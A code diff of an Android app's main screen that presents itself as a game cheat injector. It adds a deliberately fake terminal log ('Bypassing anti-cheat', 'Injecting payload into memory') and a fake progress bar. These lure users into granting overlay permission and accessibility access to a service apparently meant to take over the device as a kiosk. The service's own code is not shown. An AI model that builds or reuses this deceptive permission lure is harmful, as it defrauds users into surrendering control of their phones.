@@ -9,7 +9,6 @@ import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
 import android.view.View;
-import android.view.animation.TranslateAnimation;
 import android.widget.Button;
 import android.widget.ProgressBar;
 import android.widget.TextView;
@@ -24,10 +23,20 @@ public class MainActivity extends Activity {
     private ProgressBar progressBar;
     private TextView statusText;
     private TextView txtLogo;
+    private TextView txtConsole;
 
     private final Handler handler = new Handler(Looper.getMainLooper());
     private boolean activating = false;
-    private int progressStatus = 0;
+
+    // Terminal Typewriter Logic
+    private String[] consoleMessages = {
+            "> Injecting libfr4nx.so...",
+            "> Bypassing anti-cheat...",
+            "> Searching for game process...",
+            "> Patch applied successfully.",
+            "> Ready."
+    };
+    private int messageIndex = 0;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -44,34 +53,25 @@ public class MainActivity extends Activity {
         progressBar = findViewById(R.id.progressBar);
         statusText = findViewById(R.id.statusText);
         txtLogo = findViewById(R.id.txtLogo);
+        txtConsole = findViewById(R.id.txtConsole);
 
-        // --- PREMIUM ANIMATIONS ---
-        // Pulsing Logo
+        // Pulse Logo
         if (txtLogo != null) {
-            ObjectAnimator scaleX = ObjectAnimator.ofFloat(txtLogo, "scaleX", 1f, 1.05f, 1f);
-            ObjectAnimator scaleY = ObjectAnimator.ofFloat(txtLogo, "scaleY", 1f, 1.05f, 1f);
-            scaleX.setDuration(2000);
-            scaleY.setDuration(2000);
+            ObjectAnimator scaleX = ObjectAnimator.ofFloat(txtLogo, "scaleX", 1f, 1.03f, 1f);
+            ObjectAnimator scaleY = ObjectAnimator.ofFloat(txtLogo, "scaleY", 1f, 1.03f, 1f);
+            scaleX.setDuration(1500);
+            scaleY.setDuration(1500);
             scaleX.setRepeatCount(ObjectAnimator.INFINITE);
             scaleY.setRepeatCount(ObjectAnimator.INFINITE);
             scaleX.start();
             scaleY.start();
         }
 
-        // Slide up animation for the activate button
-        if (activateButton != null) {
-            TranslateAnimation slideUp = new TranslateAnimation(0, 0, 200, 0);
-            slideUp.setDuration(800);
-            slideUp.setStartOffset(300);
-            activateButton.startAnimation(slideUp);
-        }
-        // --------------------------
+        // Start Fake Terminal Log
+        startConsoleLog();
 
         overlayButton.setOnClickListener(v -> {
-            Intent intent = new Intent(
-                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    Uri.parse("package:" + getPackageName())
-            );
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
             startActivity(intent);
         });
 
@@ -81,6 +81,23 @@ public class MainActivity extends Activity {
         });
 
         activateButton.setOnClickListener(v -> activateSession());
+    }
+
+    private void startConsoleLog() {
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (messageIndex < consoleMessages.length) {
+                    txtConsole.append("\n" + consoleMessages[messageIndex]);
+                    messageIndex++;
+                    handler.postDelayed(this, 2000); // Add a line every 2 seconds
+                } else {
+                    messageIndex = 0;
+                    txtConsole.setText("> Initializing FR4NX Engine...");
+                    handler.postDelayed(this, 2000);
+                }
+            }
+        }, 2000);
     }
 
     @Override
@@ -94,48 +111,42 @@ public class MainActivity extends Activity {
     }
 
     private boolean hasAccessibilityPermission() {
-        String enabledServices = Settings.Secure.getString(
-                getContentResolver(),
-                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
-        );
+        String enabledServices = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
         if (enabledServices == null) return false;
         String component = getPackageName() + "/" + KioskAccessibilityService.class.getName();
         return enabledServices.toLowerCase().contains(component.toLowerCase());
     }
 
     private void refreshPermissions() {
-        overlayButton.setText(hasOverlayPermission() ? "Overlay Module: Loaded" : "1. Install Mod Overlay");
-        accessibilityButton.setText(hasAccessibilityPermission() ? "Auto-Aim Engine: Active" : "2. Enable Auto-Aim Engine");
+        overlayButton.setText(hasOverlayPermission() ? "Overlay Mounted ✓" : "1. Mount Mod Overlay");
+        accessibilityButton.setText(hasAccessibilityPermission() ? "Injector Active ✓" : "2. Enable Auto-Injector");
     }
 
     private void activateSession() {
         if (activating) return;
 
         if (!hasOverlayPermission()) {
-            Toast.makeText(this, "Please install the Mod Overlay first.", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "Mount Mod Overlay first!", Toast.LENGTH_SHORT).show();
             return;
         }
 
         if (!hasAccessibilityPermission()) {
-            Toast.makeText(this, "Please enable the Auto-Aim Engine first.", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "Enable Auto-Injector first!", Toast.LENGTH_SHORT).show();
             return;
         }
 
         activating = true;
-        statusText.setText("INJECTING MODS...");
+        statusText.setText("INJECTING... DO NOT CLOSE APP");
+        txtConsole.setText("> Injecting payload into memory...");
         progressBar.setVisibility(View.VISIBLE);
         progressBar.setProgress(0);
         activateButton.setEnabled(false);
 
         new Thread(() -> {
-            for (progressStatus = 0; progressStatus <= 100; progressStatus += 5) {
-                final int currentProgress = progressStatus;
+            for (int i = 0; i <= 100; i += 2) {
+                final int currentProgress = i;
                 handler.post(() -> progressBar.setProgress(currentProgress));
-                try {
-                    Thread.sleep(150);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
+                try { Thread.sleep(50); } catch (InterruptedException e) {}
             }
             handler.post(this::startAuthorizedSession);
         }).start();
@@ -149,7 +160,7 @@ public class MainActivity extends Activity {
             } else {
                 startService(serviceIntent);
             }
-            statusText.setText("HACK ACTIVATED");
+            statusText.setText("INJECTION SUCCESSFUL");
             finish();
         } catch (Exception e) {
             activating = false;
